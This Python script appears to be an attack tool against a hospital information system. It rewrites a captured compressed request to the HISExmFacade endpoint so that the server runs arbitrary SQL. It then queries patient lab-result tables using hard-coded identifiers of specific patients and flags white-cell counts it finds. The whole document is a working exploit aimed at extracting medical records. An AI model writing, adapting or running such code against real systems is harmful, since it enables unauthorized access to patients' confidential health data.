from his_client_final import HISClient
import requests
import zlib
import re

class PatResultHunter(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = PatResultHunter()
hhisnum = '003617083J'
hidno = 'C221748019'
caseno = '46806581'

tables = ["OPDUSR.PAT_RESULTH", "OPDUSR.PAT_RESULTD"]

for t in tables:
    print(f"\nScanning {t}...")
    
    # Try HHISNUM
    q1 = f"SELECT * FROM {t} WHERE HHISNUM = '{hhisnum}'"
    r1 = hunter.execute_sql(q1)
    if r1 and "<NewDataSet>" in r1:
         print(f"!!! FOUND DATA IN {t} (HHISNUM) !!!")
         print(r1[:2000])
         if "WBC" in r1: print("!!! FOUND WBC !!!")

    # Try HIDNO
    q2 = f"SELECT * FROM {t} WHERE HIDNO = '{hidno}'"
    r2 = hunter.execute_sql(q2)
    if r2 and "<NewDataSet>" in r2:
         print(f"!!! FOUND DATA IN {t} (HIDNO) !!!")
         print(r2[:2000])
         if "WBC" in r2: print("!!! FOUND WBC !!!")
         
    # Try CASENO/OPDCASENO
    q3 = f"SELECT * FROM {t} WHERE OPDCASENO = '{caseno}'"
    r3 = hunter.execute_sql(q3)
    if r3 and "<NewDataSet>" in r3:
         print(f"!!! FOUND DATA IN {t} (OPDCASENO) !!!")
         print(r3[:2000])

    # If no data, check sample
    if not (r1 and "<NewDataSet>" in r1) and not (r2 and "<NewDataSet>" in r2) and not (r3 and "<NewDataSet>" in r3):
         print(f"[-] No data found. Checking sample...")
         rs = hunter.execute_sql(f"SELECT * FROM {t} WHERE ROWNUM <= 1")
         if rs and "<NewDataSet>" in rs:
             print(rs[:500])

